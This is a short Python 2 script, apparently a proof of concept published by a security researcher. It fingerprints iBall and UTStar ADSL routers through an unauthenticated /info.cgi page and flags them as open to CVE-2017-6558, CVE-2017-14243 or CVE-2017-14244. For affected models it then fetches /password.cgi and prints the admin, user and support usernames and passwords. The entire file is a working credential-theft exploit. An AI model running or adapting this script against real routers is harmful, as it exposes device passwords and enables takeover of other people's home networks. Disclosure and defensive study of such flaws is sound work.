#/bin/python
# -*- coding: utf-8 -*- 
import sys
import os
import urllib2
import argparse
import re
from termcolor import colored

def get_response(url):
	response = urllib2.urlopen(url)
	return response.read()

def get_info(url):
	res = get_response(url + '/info.cgi')
	if "iB-WRA150N" in res: 	
		print colored('[INF]','green'),  'Device identified: iBall 150M Wireless-N ADSL2+ Router (iB-WRA150N)'
		print colored('[RES]', 'red'),  'Vulnerable to CVE-2017-6558'
		print colored('[RES]', 'red'), 'Firmware Version: ' + find_between(res, '<td>', '</td>')
		get_cred(url)
	else:
		if "ADSL2+" in res:		
			print colored('[INF]','green'), 'Device identified: iBall ADSL2+ Home Router WRA150N'
			print colored('[RES]','red'), 'Vulnerble to CVE-2017-14244'
			print colored('[RES]','red'),'Firmware Version: FW' + find_between(res, 'FW', '</td>')
		else:
			if "96338W" in res:	
				print colored('[INF]','green'), 'Device identified: UTStar WA3002G4 ADSL Broadband Modem'
				print colored('[RES]','red'), 'Vulnerble to CVE-2017-14243'
				get_cred(url)
			else:
				print colored('[INF]','green'), 'Device not vulnerable to CVE-2017-6558, CVE-2017-14243 or CVE-2017-14244'
	
	print colored('\r\nCompleted!\r\n','green'), 
def get_cred(url):
	res = get_response(url + '/password.cgi')
	matches = re.findall("(?<=\s').*?(?=')", res, re.DOTALL)
	print '\nUsernames\tPasswords\n', colored('---------\t----------', 'green')
	print 'admin\t\t' + matches[0] + '\nuser\t\t' + matches[1] + '\nsupport\t\t' + matches[2]

def find_between( s, first, last ):
	try:
		start = s.index( first ) + len( first )
		end = s.index( last, start )
		return s[start:end]
	except ValueError:
        	return ""

def display_info():
	print colored('\r\n¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦','green')
	print colored('¦','green'), '  Check for CVE-2017-6558, CVE-2017-14243 & CVE-2017-14244	', colored('¦','green')
	print colored('¦','green'), '		 Created by: Gem George				' , colored('¦','green')
	print colored('¦','green'), '	 Website: https://www.techipick.com/ 			', colored('¦','green')
	print colored('¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦','green')
	print "\r\n"
	print colored('[SET]','blue'), 'Target URL: ', sys.argv[1]

def main():
	if len(sys.argv) != 2:
		print 'Wrong argument count\nEg: ' + os.path.basename(__file__) + ' http://192.168.1.1'
		exit()
	else:
		display_info()		
		url = sys.argv[1].rstrip('/')
		get_info(url)
 
if __name__ == "__main__":
    main()
